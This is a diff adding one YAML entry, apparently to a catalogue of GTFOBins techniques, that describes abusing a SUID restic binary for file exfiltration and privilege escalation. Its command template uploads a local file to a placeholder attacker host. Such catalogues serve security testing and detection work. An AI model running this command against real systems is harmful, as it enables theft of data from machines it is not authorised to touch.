@@ -1,0 +1,24 @@
+id: gtfobins/restic/upload/suid
+type: binary
+platform: linux
+name: restic
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
+references:
+- https://gtfobins.github.io/gtfobins/restic/
+tags:
+- linux
+- unix
+- gtfobins
